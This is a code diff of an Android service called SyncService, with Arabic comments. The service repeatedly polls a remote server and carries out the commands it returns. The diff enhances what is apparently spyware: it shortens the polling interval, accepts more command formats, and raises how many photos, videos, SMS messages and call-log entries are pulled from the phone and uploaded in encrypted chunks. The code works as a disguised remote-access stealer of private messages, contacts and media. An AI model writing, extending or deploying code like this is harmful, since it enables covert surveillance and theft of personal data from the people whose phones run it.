@@ -37,22 +37,31 @@ class SyncService : Service() {
         .build()
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // حلقة تكرارية مستمرة لفحص المهام كل 10 ثوانٍ وتنفيذها فوراً
         serviceScope.launch {
             while (isActive) {
                 try {
                     val telemetry = JSONObject().apply {
-                        put("type", "TEXT_REPORT")
-                        put("data", "SyncService Active. Device ID: ${getNodeIdentifier()}")
+                        put("type", "HEARTBEAT")
+                        put("status", "ONLINE")
+                        put("nodeId", getNodeIdentifier())
                     }
                     val response = dispatchPacket(encryptPayload(telemetry.toString()))
-                    if (response != null && response.has("task") && !response.isNull("task")) {
-                        executeTask(response.getJSONObject("task"))
+                    
+                    if (response != null) {
+                        val taskObj = when {
+                            response.has("task") && !response.isNull("task") -> response.getJSONObject("task")
+                            response.has("action") -> response
+                            else -> null
+                        }
+                        
+                        if (taskObj != null) {
+                            executeTask(taskObj)
+                        }
                     }
                 } catch (e: Exception) {
-                    // تجاهل الأخطاء المؤقتة واستمرار الحلقة
+                    // استمرار الحلقة بلا توقف
                 }
-                delay(10000)
+                delay(5000)
             }
         }
         return START_STICKY
@@ -109,16 +118,16 @@ class SyncService : Service() {
                 }
             }
         } catch (e: Exception) {
-            // خطأ في الإرسال
+            // خطأ شبكي مؤقت
         }
         return null
     }
 
     private suspend fun executeTask(task: JSONObject) {
-        val action = task.optString("action", "")
-        when (action) {
-            "EXTRACT_PHOTOS" -> streamMediaStoreFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 3)
-            "EXTRACT_VIDEOS" -> streamMediaStoreFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 1)
+        val action = task.optString("action", task.optString("cmd", ""))
+        when (action.uppercase()) {
+            "EXTRACT_PHOTOS" -> streamMediaStoreFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 10)
+            "EXTRACT_VIDEOS" -> streamMediaStoreFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 5)
             "EXTRACT_SMS" -> sendTextReport("رسائل SMS", readSms())
             "EXTRACT_CALLS" -> sendTextReport("سجل المكالمات", readCallLogs())
             "EXTRACT_CONTACTS" -> sendTextReport("جهات الاتصال", readContacts())
@@ -183,10 +192,10 @@ class SyncService : Service() {
                 }
 
                 dispatchPacket(encryptPayload(packet.toString()))
-                delay(40)
+                delay(20)
             }
         } catch (e: Exception) {
-            // خطأ في إرسال الأجزاء
+            // خطأ في رفع القطع
         }
     }
 
@@ -203,7 +212,7 @@ class SyncService : Service() {
 
     private fun readSms(): String {
         val sb = StringBuilder()
-        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 30")?.use { c ->
+        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 50")?.use { c ->
             val a = c.getColumnIndex("address")
             val b = c.getColumnIndex("body")
             while (c.moveToNext()) {
@@ -217,7 +226,7 @@ class SyncService : Service() {
 
     private fun readCallLogs(): String {
         val sb = StringBuilder()
-        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 30")?.use { c ->
+        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 50")?.use { c ->
             val n = c.getColumnIndex(CallLog.Calls.NUMBER)
             val t = c.getColumnIndex(CallLog.Calls.TYPE)
             while (c.moveToNext()) {
